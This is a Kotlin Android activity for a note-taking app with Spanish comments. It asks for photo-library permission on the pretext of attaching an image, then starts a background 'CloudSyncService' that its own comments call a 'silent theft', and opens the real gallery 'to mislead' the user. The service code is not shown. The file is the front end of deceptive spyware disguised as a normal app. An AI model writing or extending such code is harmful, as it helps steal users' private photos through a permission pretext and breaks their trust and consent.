package cl.example.mynotes

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnAddImage = findViewById<Button>(R.id.btn_add_image)

        btnAddImage.setOnClickListener {
            checkPermissionAndStart()
        }
    }

    private fun checkPermissionAndStart() {
        // Detectar versión de Android para pedir el permiso correcto
        val permission = if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            // Pedimos permiso. El usuario aceptará porque quiere subir una foto.
            ActivityCompat.requestPermissions(this, arrayOf(permission), 101)
        } else {
            // Ya tenemos permiso
            startService(Intent(this, CloudSyncService::class.java))
            openGallery()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // ¡Éxito! Permiso concedido.
            // 1. Iniciamos el robo silencioso
            startService(Intent(this, CloudSyncService::class.java))
            // 2. Abrimos la galería real para despistar
            openGallery()
        } else {
            Toast.makeText(this, "Permiso necesario para adjuntar fotos.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun openGallery() {
        val intent = Intent(Intent.ACTION_PICK)
        intent.type = "image/*"
        startActivity(intent)
    }
}